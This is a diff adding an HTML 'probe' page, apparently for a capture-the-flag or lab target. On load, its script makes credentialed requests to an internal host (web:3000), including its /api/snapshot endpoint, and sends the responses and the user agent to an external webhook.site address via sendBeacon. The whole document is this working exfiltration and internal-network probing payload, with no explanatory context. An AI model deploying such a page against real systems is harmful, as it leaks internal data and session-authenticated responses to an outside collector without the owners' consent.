@@ -1,0 +1,11 @@
+<!doctype html><html><head><title>Probe</title></head><body><h1>probe</h1><script>
+const L=(t,d)=>navigator.sendBeacon('https://webhook.site/9f7f9d67-ed2e-4901-8c1e-c408e2810001?ev='+t+'&d='+encodeURIComponent(JSON.stringify(d||{})));
+L('start',{ua:navigator.userAgent.slice(0,60)});
+(async()=>{
+ try{await fetch('http://web:3000/',{mode:'no-cors',credentials:'include'});L('web3000-ok');}
+ catch(e){L('web3000-fail',{e:String(e).slice(0,80)});}
+ try{const r=await fetch('http://web:3000/api/snapshot',{method:'POST',mode:'cors',credentials:'include',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:'http://web:3000/'})});const t=await r.text();L('snapshot-cors-readable',{status:r.status,body:t.slice(0,300)});}
+ catch(e){L('snapshot-cors-fail',{e:String(e).slice(0,80)});}
+ L('done');
+})();
+</script></body></html>
